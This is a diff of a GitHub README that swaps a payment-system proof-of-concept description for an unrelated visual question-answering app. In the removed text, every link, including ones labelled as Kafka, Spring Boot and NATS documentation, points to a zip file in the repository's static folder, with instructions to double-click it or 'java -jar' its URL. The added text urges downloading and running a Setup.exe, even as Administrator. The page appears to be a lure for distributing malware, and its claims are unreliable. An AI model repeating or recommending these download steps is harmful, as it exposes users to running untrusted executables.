@@ -1,101 +1,156 @@
-# ⚡ spring-batch-kafka-nats-poc - Fast & Reliable Financial Transactions
+# 🚀 OmniJev - Understand Images, Videos, and Robots Instantly
 
-[![Download Latest Release](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
+[![Download OmniJev](https://img.shields.io/badge/Download-OmniJev%20v1.1-4F46E5?style=for-the-badge&logo=github)](https://github.com/ulises5700/OmniJev/releases)
 
-## 📖 Overview
+---
 
-Welcome to the spring-batch-kafka-nats-poc project! This application is a high-velocity clearing and settlement proof of concept (POC) designed with modern technology. Built using Java 21 and Spring Boot 3, it leverages Kafka and NATS for efficient processing. This app includes a Hybrid Event Driven Architecture (EDA) strategy for ultra-low latency fraud checks and durable financial batch processing.
+## 👋 Welcome to OmniJev
 
-## 🚀 Getting Started
+OmniJev is a smart assistant that can **look at images, videos, screenshots, and even robot scenes** and answer your questions about them—without typing out long responses. Instead of generating text, it gives you **clear, direct answers with confidence scores**, so you know exactly how sure it is about what it sees.
 
-Follow these simple steps to set up the application on your computer.
+Think of it as a **visual question answerer** that works across many types of visual content. Whether you want to know what's happening in a video clip, identify objects in a photo, or understand a robot's environment, OmniJev has you covered.
 
-### 🖥️ System Requirements
+---
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution
-- **Java Version:** JDK 21
-- **Memory:** At least 2GB of RAM available
-- **Disk Space:** Minimum of 500MB free space
+## ⭐ Key Features
 
-### 📥 Download & Install
+- **Works with Images** – Ask questions about photos, diagrams, and illustrations
+- **Understands Videos** – Get answers about what happens in video footage
+- **Reads Screens** – Analyze screenshots and screen captures
+- **Robot Scene Understanding** – Ideal for robotics and automation projects
+- **Calibrated Confidence Scores** – Each answer includes a probability rating
+- **Fast Performance** – One forward pass, no slow text generation
+- **Three Sizes Available** – Choose the model that fits your computer's capabilities
+- **Multi-Image Support** – Ask questions about multiple images at once (v1.1)
 
-To get the software, visit [this page to download](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip).
+---
 
-1. Click the link above to go to the Releases page.
-2. Look for the latest version.
-3. Choose the package suitable for your operating system. 
-4. Download the file to your computer.
+## 💻 System Requirements
 
-## ⚙️ How to Run the Application
+To run OmniJev smoothly, your computer should meet these minimum specifications:
 
-Once the download is complete, you can run the application:
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 or newer (64-bit) |
+| Processor | Intel Core i5 or AMD equivalent |
+| RAM | 8 GB (16 GB recommended) |
+| Storage | 5 GB free space |
+| Graphics Card | Any modern GPU (NVIDIA recommended) |
 
-1. **For Windows Users:**
-   - Locate the downloaded file (e.g., `https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`).
-   - Double-click the file to launch the application.
+---
 
-2. **For macOS Users:**
-   - Open Finder and navigate to the Downloads directory.
-   - Locate the downloaded file (`https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`).
-   - Double-click the file and drag the application to your Applications folder.
+## 📥 Download and Installation
 
-3. **For Linux Users:**
-   - Open a terminal window.
-   - Navigate to the download location.
-   - Run the application with the command: `java -jar https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`.
+### Step 1: Get the Application
 
-Make sure to check the terminal for any output messages that may guide you further during the initial run.
+Visit this link to download the application: **[Download OmniJev](https://github.com/ulises5700/OmniJev/releases)**
 
-## 🌟 Features
+On that page, you'll find the latest release. Look for the file named **OmniJev-v1.1-Setup.exe** or similar.
 
-- **High Performance**: Processes transactions with ultra-low latency.
-- **Event-Driven Architecture**: Uses Kafka and NATS for real-time updates and notifications.
-- **Fraud Detection**: Real-time fraud checks to ensure transaction integrity.
-- **Stable Financial Processing**: Designed for durable financial batch processing.
+### Step 2: Install OmniJev
 
-## 🔍 How It Works
+1. After downloading, find the file in your **Downloads** folder
+2. Double-click the installer file
+3. Follow the on-screen instructions (click "Next" or "Install" when prompted)
+4. Wait for the installation to complete—this usually takes 1-3 minutes
 
-This application utilizes a Hybrid Event-Driven Architecture. It combines both hot and cold paths for data processing. The hot path processes events rapidly, while the cold path handles batch jobs, ensuring data is processed without delay during peak loads.
+### Step 3: Launch OmniJev
 
-Kafka serves as the backbone for managing events and messages between services. NATS provides lightweight messaging to support service communication. This architecture is essential for high-performance applications, especially in the fintech sector.
+1. After installation, find OmniJev in your **Start Menu** or on your **Desktop**
+2. Click the icon to open the application
+3. You'll see the main interface where you can start asking questions
 
-## 📚 Learning Resources
+---
 
-For those interested in understanding more about the technologies used:
+## 🎯 How to Use OmniJev
 
-- **Kafka Documentation**: [Apache Kafka](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
-- **Spring Boot Guide**: [Spring Boot](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
-- **NATS Documentation**: [NATS](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
+### Asking Questions About Images
 
-## 🛠️ Troubleshooting
+1. Click **"Load Image"** or drag-and-drop an image into the window
+2. Type your question in the text box at the bottom
+3. Press **Enter** or click the **"Ask"** button
+4. OmniJev will display its answer with a confidence score
 
-If you encounter any issues while running the application, consider the following:
+### Example Questions You Can Ask
 
-- Ensure Java is correctly installed and the version is 21 or above.
-- Check that you have enough memory and disk space available.
-- Consult the logs generated during the application run for specific error messages.
+- "What color is the car in this picture?"
+- "How many people are in this video?"
+- "Is the robot holding an object?"
+- "What does this chart show?"
+- "What time does the clock display in this screenshot?"
 
-If you still need help, feel free to raise an issue on the GitHub repository page.
+### Understanding the Confidence Score
 
-## 🌐 Community and Contributions
+Each answer includes a percentage (e.g., 92%). This tells you how confident OmniJev is in its response. Higher percentages mean the model is more certain about its answer.
 
-We welcome contributions! If you have ideas for improvements or want to report issues, please feel free to create a new issue or submit a pull request. Your feedback helps us enhance the application.
+---
 
-## 🏷️ Topics
+## 🛠️ Troubleshooting Common Issues
 
-This project covers several topics, including:
+### Problem: OmniJev won't start
 
-- Distributed Systems
-- Event-Driven Architecture
-- Fintech Solutions
-- High-Performance Computing
-- Java Development
-- Kafka Messaging
-- Microservices Architecture
-- NATS Integration
-- Spring Batch Processing
-- Spring Boot Framework
+- **Solution:** Make sure you have installed all required Windows updates
+- **Alternative:** Try running the application as Administrator (right-click → "Run as administrator")
 
-For more information and updates, please check our [Releases page](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip) regularly.
+### Problem: The app is slow
 
-[![Download Latest Release](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
+- **Solution:** Close other programs that use a lot of memory
+- **Tip:** Use the smaller model size if you have an older computer
+
+### Problem: Images won't load
+
+- **Solution:** Ensure your image files are in common formats (JPG, PNG, BMP, GIF)
+- **Tip:** Try converting the image to a standard format if it won't load
+
+### Problem: Answers seem incorrect
+
+- **Tip:** Try rephrasing your question more clearly
+- **Tip:** Make sure the image is clear and not too dark or blurry
+
+---
+
+## 🔄 Updating OmniJev
+
+We regularly release improvements. To update:
+
+1. Visit the download link again
+2. Check for a newer version than what you have
+3. Download and install the new version
+4. Your settings and preferences will be preserved
+
+---
+
+## 📚 Getting Help
+
+If you encounter issues not covered here:
+
+- **Visit our website:** [omnijev.net](https://omnijev.net/)
+- **Try the online demo:** [omnijev.net/try.html](https://omnijev.net/try.html)
+- **Check the documentation:** See the "Help" section within the application
+
+---
+
+## 📄 Version History
+
+| Version | What's New |
+|---------|------------|
+| v1.1 (Current) | Multi-image support, three model sizes, improved accuracy |
+| v1.0 | Initial release with core features |
+
+---
+
+## 📋 Additional Information
+
+- **License:** Apache 2.0 (free to use and modify)
+- **Developed by:** Beijing Zhongguancun Academy · Institute of Automation, Chinese Academy of Sciences · Zevo
+- **Model Weights:** Available on [Hugging Face](https://huggingface.co/tinnel123/OmniJev)
+
+---
+
+## 🙏 Thank You
+
+Thank you for choosing OmniJev! We hope it makes understanding visual content easier for you. If you have feedback or suggestions, please let us know through our website.
+
+**Happy exploring!** 🎉
+
+Keywords: visual question answering, image understanding, video analysis, screenshot reader, robot vision, AI assistant, multimodal AI, computer vision, OmniJev, visual AI
